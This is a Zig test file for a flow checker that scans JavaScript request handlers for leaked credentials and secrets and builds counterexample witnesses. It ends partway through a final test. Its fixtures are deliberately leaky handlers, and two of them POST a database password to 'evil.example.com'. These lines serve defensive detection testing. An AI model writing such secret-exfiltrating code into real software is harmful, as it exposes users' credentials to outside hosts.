//! Tests for the flow checker facade: every probe that runs `FlowChecker` over a handler.

const std = @import("std");
const engine = @import("zts-engine");
const evaluator = @import("flow_interp.zig");
const type_checker = @import("type_checker.zig");
const ir = engine.parser.ir;
const atom_table = engine.atom_table;
const counterexample = @import("counterexample.zig");
const handler_function_mod = @import("handler_function.zig");
const NodeIndex = ir.NodeIndex;
const IrView = ir.IrView;
const mb = engine.module_binding;
const LabelSet = mb.LabelSet;
const flow_checker_mod = @import("flow_checker.zig");
const FlowChecker = flow_checker_mod.FlowChecker;
const DiagnosticKind = flow_checker_mod.DiagnosticKind;
const Severity = flow_checker_mod.Severity;
const propertyTagForKind = flow_checker_mod.propertyTagForKind;
const SafeForm = flow_checker_mod.SafeForm;
const FlowProperties = flow_checker_mod.FlowProperties;
const RepairIntent = flow_checker_mod.RepairIntent;

test "candidate facade owns captures and retains warning diagnostics" {
    const allocator = std.testing.allocator;
    var atoms = engine.atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    var parser = try engine.parser.JsParser.init(allocator, "function handler(req) { function read() { return req.headers.authorization; } return read(); }");
    defer parser.deinit();
    parser.setAtomTable(&atoms);
    const root = try parser.parse();
    const view = ir.IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler = handler_function_mod.findHandlerFunction(view, root) orelse return error.HandlerNotFound;
    var checker = FlowChecker.init(allocator, view, &atoms);
    defer checker.deinit();
    checker.scopes = &parser.scopes;
    try std.testing.expectEqual(@as(u32, 0), try checker.check(handler));
    try std.testing.expect(!checker.getProperties().no_credential_leakage);
    var saw_warning = false;
    for (checker.getDiagnostics()) |diagnostic| {
        if (diagnostic.kind == .credential_in_response and diagnostic.severity == .warning) saw_warning = true;
    }
    try std.testing.expect(saw_warning);
}

test "FlowChecker fails closed when taint state cannot allocate" {
    const allocator = std.testing.allocator;
    const source = "function handler(req) { return Response.json(req); }";
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(view, root) orelse
        return error.HandlerNotFound;

    var failing = std.testing.FailingAllocator.init(allocator, .{ .fail_index = 0 });
    var checker = FlowChecker.init(failing.allocator(), view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    try std.testing.expectError(error.OutOfMemory, checker.check(handler_fn));
}

test "FlowChecker fails closed when diagnostic storage cannot allocate" {
    const allocator = std.testing.allocator;
    const source = "function handler() { return Response.json({ ok: true }); }";
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    try std.testing.expectEqual(@as(u32, 0), try checker.check(handler_fn));
    try std.testing.expectEqual(@as(usize, 0), checker.getDiagnostics().len);

    var leaking = try @import("zts-engine").parser.JsParser.init(allocator, "function handler(req) { return Response.json(req.headers.authorization); }");
    var leaking_atoms = atom_table.AtomTable.init(allocator);
    defer leaking_atoms.deinit();
    leaking.setAtomTable(&leaking_atoms);
    defer leaking.deinit();
    const leaking_root = try leaking.parse();
    const leaking_view = IrView.fromIRStore(&leaking.nodes, &leaking.constants);
    const leaking_handler = handler_function_mod.findHandlerFunction(leaking_view, leaking_root) orelse
        return error.HandlerNotFound;
    const Probe = struct {
        fn run(probe_allocator: std.mem.Allocator, input: IrView, handler: NodeIndex, input_atoms: *atom_table.AtomTable, scopes: *const @import("zts-engine").parser.ScopeAnalyzer) !void {
            var probe = FlowChecker.init(probe_allocator, input, input_atoms);
            probe.scopes = scopes;
            defer probe.deinit();
            try std.testing.expectEqual(@as(u32, 0), try probe.check(handler));
            try std.testing.expect(!probe.getProperties().no_credential_leakage);
            try std.testing.expectEqual(@as(usize, 1), probe.getDiagnostics().len);
            try std.testing.expectEqual(DiagnosticKind.credential_in_response, probe.getDiagnostics()[0].kind);
            try std.testing.expectEqual(Severity.warning, probe.getDiagnostics()[0].severity);
        }
    };
    // Every allocation on a real diagnostic-producing path must propagate
    // failure, including the storage that publishes the diagnostic itself.
    var no_resize = std.testing.FailingAllocator.init(allocator, .{ .resize_fail_index = 0 });
    try std.testing.checkAllAllocationFailures(no_resize.allocator(), Probe.run, .{ leaking_view, leaking_handler, &leaking_atoms, &leaking.scopes });
}

test "FlowChecker captures witness constraints on secret-in-response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret !== undefined) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    // Expect exactly one secret-in-response diagnostic, carrying a
    // stub_present constraint on the present env value and a tracked env I/O call.
    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        try std.testing.expectEqual(
            counterexample.PropertyTag.no_secret_leakage,
            propertyTagForKind(d.kind).?,
        );
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_present);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_present.func);
        try std.testing.expect(w.io_calls.len >= 1);
        try std.testing.expectEqualStrings("env", w.io_calls[0].func);
    }
    try std.testing.expect(found);
}

test "FlowChecker does not leak sibling-branch I/O calls into the witness" {
    // If a module call happens inside the branch that does NOT reach the
    // sink, the fall-through sink's witness must not include it - otherwise
    // the synthesised stub sequence would drive the handler down the wrong
    // path. Regression test for the shrinkRetainingCapacity fix around
    // `.if_stmt` in walkStmt.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret === undefined) {
        \\    const cached = cacheGet("sibling");
        \\    return Response.json({ ok: cached });
        \\  }
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        for (w.io_calls) |call| {
            // `cacheGet` is only called on the sibling branch that returns
            // without leaking. It must not appear in this witness.
            try std.testing.expect(!std.mem.eql(u8, call.func, "cacheGet"));
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker captures stub_present on if-else with absent condition" {
    // `if (secret === undefined) { ok } else { leak }` - the else branch's
    // effective constraint requires a present secret value.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret === undefined) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_present);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_present.func);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures req_method constraint from literal comparison" {
    // `if (req.method === "POST") { leak }` - the witness request must be
    // POST, not the default GET, so the handler reaches the sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST") {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method);
        try std.testing.expectEqualStrings("POST", w.path_constraints[0].req_method);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures AND chain as multiple constraints" {
    // `if (req.method === "POST" && secret !== undefined) { leak }` produces
    // TWO constraints: the method literal and env presence. The solver turns
    // this into a POST request whose env stub returns a value.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST" && secret !== undefined) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.path_constraints.len);

        var saw_method = false;
        var saw_truthy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .req_method => |m| {
                    try std.testing.expectEqualStrings("POST", m);
                    saw_method = true;
                },
                .stub_present => |info| {
                    try std.testing.expectEqualStrings("env", info.func);
                    saw_truthy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_method and saw_truthy);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures one concrete negated request constraint for else AND path" {
    // `!(req.method === "GET" && secret !== undefined)` should use one concrete false
    // clause. Pick a non-GET method and leave the env call on its default
    // truthy stub so replay still leaks the sentinel secret.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "GET" && secret !== undefined) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method_not);
        try std.testing.expectEqualStrings("GET", w.path_constraints[0].req_method_not);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("POST", witness.request.method);
        try std.testing.expectEqual(@as(usize, 1), witness.io_stubs.len);
        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps repeated module call constraints tied to call index" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const a = env("SECRET_A");
        \\  const b = env("SECRET_B");
        \\  if (a !== undefined) {
        \\    if (b === undefined) {
        \\      return Response.json({ leaked: a });
        \\    }
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.io_calls.len);

        var saw_a_truthy = false;
        var saw_b_falsy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .stub_present => |info| {
                    try std.testing.expectEqual(@as(?u32, 0), info.call_index);
                    saw_a_truthy = true;
                },
                .stub_absent => |info| {
                    try std.testing.expectEqual(@as(?u32, 1), info.call_index);
                    saw_b_falsy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_a_truthy and saw_b_falsy);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
        try std.testing.expectEqualStrings("null", witness.io_stubs[1].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures result_ok constraint on validated path" {
    // `if (r.ok) { leak(env()) }` - the witness must make jwtVerify
    // return an ok Result so the sink is reachable.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\import { jwtVerify } from "zttp:auth";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const r = jwtVerify("token", "key");
        \\  if (r.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        var saw_result_ok = false;
        for (w.path_constraints) |c| {
            if (c == .result_ok) {
                try std.testing.expectEqualStrings("jwtVerify", c.result_ok.func);
                saw_result_ok = true;
            }
        }
        try std.testing.expect(saw_result_ok);
    }
    try std.testing.expect(found);
}

/// Test harness: the JSONL of the witness that the solver builds for the first
/// `secret_in_response` diagnostic of `source`. The caller frees the result.
fn secretWitnessJsonl(allocator: std.mem.Allocator, source: []const u8) ![]u8 {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        const w = d.witness orelse return error.MissingWitness;
        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);
        var aw: std.Io.Writer.Allocating = .init(allocator);
        errdefer aw.deinit();
        try counterexample.writeJsonl(&aw.writer, witness);
        return aw.toOwnedSlice();
    }
    return error.NoSecretDiagnostic;
}

const fetch_io_503 =
    \\{"type":"io","seq":1,"module":"fetch","fn":"fetch","result":{"status":503,"statusText":"Service Unavailable","ok":false,"headers":{},"body":"{}"}}
;

const fetch_io_200 =
    \\{"type":"io","seq":1,"module":"fetch","fn":"fetch","result":{"status":200,"statusText":"OK","ok":true,"headers":{},"body":"{\"id\":\"1\"}"}}
;

fn expectFetchIo(jsonl: []const u8, expected: []const u8) !void {
    if (std.mem.indexOf(u8, jsonl, expected) == null) {
        std.debug.print("\nexpected the witness to contain:\n{s}\ngot:\n{s}\n", .{ expected, jsonl });
        return error.TestExpectedEqual;
    }
}

const fetch_leak_prefix =
    \\import { env } from "zttp:env";
    \\import { fetch } from "zttp:fetch";
    \\
;

test "a leak behind !res.ok drives the fetch to the failing stub" {
    const source = fetch_leak_prefix ++
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const res = fetch("https://api.example.com/a");
        \\  if (!res.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;
    const jsonl = try secretWitnessJsonl(std.testing.allocator, source);
    defer std.testing.allocator.free(jsonl);
    try expectFetchIo(jsonl, fetch_io_503);
}

test "a leak behind res.status !== 200 drives the fetch to the failing stub" {
    const source = fetch_leak_prefix ++
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const res = fetch("https://api.example.com/a");
        \\  if (res.status !== 200) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;
    const jsonl = try secretWitnessJsonl(std.testing.allocator, source);
    defer std.testing.allocator.free(jsonl);
    try expectFetchIo(jsonl, fetch_io_503);
}

test "a leak only on the fetch success side drives the fetch to the 200 stub" {
    const ok_source = fetch_leak_prefix ++
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const res = fetch("https://api.example.com/a");
        \\  if (res.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ error: "upstream" }, { status: 502 });
        \\}
    ;
    const eq_source = fetch_leak_prefix ++
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const res = fetch("https://api.example.com/a");
        \\  if (res.status === 200) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ error: "upstream" }, { status: 502 });
        \\}
    ;
    for ([_][]const u8{ ok_source, eq_source }) |source| {
        const jsonl = try secretWitnessJsonl(std.testing.allocator, source);
        defer std.testing.allocator.free(jsonl);
        try expectFetchIo(jsonl, fetch_io_200);
    }
}

test "a leak on a status test that does not fork gets a status that takes the branch" {
    const Row = struct { cond: []const u8, status: []const u8 };
    const rows = [_]Row{
        .{ .cond = "res.status === 404", .status = "\"status\":404,\"statusText\":\"Not Found\"" },
        .{ .cond = "res.status >= 500", .status = "\"status\":500,\"statusText\":\"Internal Server Error\"" },
        .{ .cond = "404 === res.status", .status = "\"status\":404,\"statusText\":\"Not Found\"" },
    };
    for (rows) |row| {
        const source = try std.testing.allocator.print(
            \\{s}
            \\function handler(req) {{
            \\  const secret = env("API_SECRET");
            \\  const res = fetch("https://api.example.com/a");
            \\  if ({s}) {{
            \\    return Response.json({{ leaked: secret }});
            \\  }}
            \\  return Response.json({{ ok: true }});
            \\}}
        , .{ fetch_leak_prefix, row.cond });
        defer std.testing.allocator.free(source);
        const jsonl = try secretWitnessJsonl(std.testing.allocator, source);
        defer std.testing.allocator.free(jsonl);
        try expectFetchIo(jsonl, row.status);
    }
}

test "a status test and an ok test on one fetch are solved together" {
    const source = fetch_leak_prefix ++
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const res = fetch("https://api.example.com/a");
        \\  if (res.status === 404) {
        \\    if (!res.ok) {
        \\      return Response.json({ leaked: secret });
        \\    }
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;
    const jsonl = try secretWitnessJsonl(std.testing.allocator, source);
    defer std.testing.allocator.free(jsonl);
    try expectFetchIo(jsonl, "\"status\":404,\"statusText\":\"Not Found\"");
}

test "status boundaries are exact while unsupported aliases and comparisons decline witnesses" {
    const sources = [_][]const u8{
        // Scalar status copies lack status-role evidence; no default capsule is fabricated.
        fetch_leak_prefix ++
            \\function handler(req) {
            \\  const secret = env("API_SECRET");
            \\  const res = fetch("https://api.example.com/a");
            \\  const s = res.status;
            \\  if (s !== 200) {
            \\    return Response.json({ leaked: secret });
            \\  }
            \\  return Response.json({ ok: true });
            \\}
        ,
        // A comparison with the same value at every status splits nothing.
        fetch_leak_prefix ++
            \\function handler(req) {
            \\  const secret = env("API_SECRET");
            \\  const res = fetch("https://api.example.com/a");
            \\  if (res.status >= 100) {
            \\    return Response.json({ leaked: secret });
            \\  }
            \\  return Response.json({ ok: true });
            \\}
        ,
        // A non-literal operand.
        fetch_leak_prefix ++
            \\function handler(req) {
            \\  const secret = env("API_SECRET");
            \\  const res = fetch("https://api.example.com/a");
            \\  if (res.status !== req.method) {
            \\    return Response.json({ leaked: secret });
            \\  }
            \\  return Response.json({ ok: true });
            \\}
        ,
    };
    for (sources, 0..) |source, index| {
        if (index == 0 or index == 2) {
            try std.testing.expectError(error.MissingWitness, secretWitnessJsonl(std.testing.allocator, source));
            continue;
        }
        const jsonl = try secretWitnessJsonl(std.testing.allocator, source);

        defer std.testing.allocator.free(jsonl);
        try expectFetchIo(jsonl, fetch_io_200);
    }
}

test "a status test on a Result export records no constraint" {
    const source =
        \\import { env } from "zttp:env";
        \\import { validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const r = validateJson(0, "{}");
        \\  if (r.status === 404) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;
    // A Result has no HTTP status. The flow verdict remains conservative,
    // but no fabricated default stub claims to execute this branch.
    try std.testing.expectError(error.MissingWitness, secretWitnessJsonl(std.testing.allocator, source));
}

test "a Result export witness keeps its Result stub" {
    const ok_source =
        \\import { env } from "zttp:env";
        \\import { jwtVerify } from "zttp:auth";
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const r = jwtVerify("token", "key");
        \\  if (r.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;
    const jsonl = try secretWitnessJsonl(std.testing.allocator, ok_source);
    defer std.testing.allocator.free(jsonl);
    try expectFetchIo(jsonl,
        \\{"type":"io","seq":1,"module":"auth","fn":"jwtVerify","result":{"ok":true,"value":{}}}
    );

    const failed_source =
        \\import { env } from "zttp:env";
        \\import { jwtVerify } from "zttp:auth";
        \\function handler(req) {
        \\  const secret = env("API_SECRET");
        \\  const r = jwtVerify("token", "key");
        \\  if (!r.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;
    const failed = try secretWitnessJsonl(std.testing.allocator, failed_source);
    defer std.testing.allocator.free(failed);
    try expectFetchIo(failed,
        \\{"type":"io","seq":1,"module":"auth","fn":"jwtVerify","result":{"ok":false,"error":"counterexample"}}
    );
}

test "FlowChecker records validated defended path reaching egress body" {
    const allocator = std.testing.allocator;
    const source =
        \\import { validateObject } from "zttp:validate";
        \\function handler(req) {
        \\  const v = validateObject("{}", req.body);
        \\  fetchSync("https://api.example.com", { method: "POST", body: v.value });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_injection = false;
    var saw_input_validated = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            saw_injection = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("validateObject", d.guard_func.?);
        }
        if (d.property == .input_validated) saw_input_validated = true;
    }
    try std.testing.expect(saw_injection);
    try std.testing.expect(saw_input_validated);
    // The property itself must actually hold for the card to render.
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "FlowChecker flags a secret reaching a module fetch body" {
    // Regression: the egress sink check recognized only the bare `fetchSync`
    // global, so a secret sent via the documented `zttp:fetch` API was not
    // flagged and no_secret_leakage was falsely proven.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("DB_PASSWORD");
        \\  fetch("https://evil.example.com", { method: "POST", body: secret });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching a var-bound module fetch body" {
    // Regression (#11): the egress sink check ran only on bare-statement calls
    // (.expr_stmt / .call), so binding the fetch result -- the dominant idiom,
    // `const r = fetch(url, { body: secret })` -- bypassed the check entirely
    // and falsely proved no_secret_leakage. The .var_decl arm now sink-checks
    // its initializer too.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("DB_PASSWORD");
        \\  const r = fetch("https://evil.example.com", { method: "POST", body: secret });
        \\  return Response.json({ ok: r.ok });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching a module fetch query field" {
    // Regression: the new `query` init field is appended to the egress URL at
    // runtime, but inferObjectBodyLabels returned only the `body` value when a
    // body key was present, so a secret in `query` escaped every sink check and
    // no_secret_leakage was falsely proven and signed into the attestation.
    const allocator = std.testing.allocator;
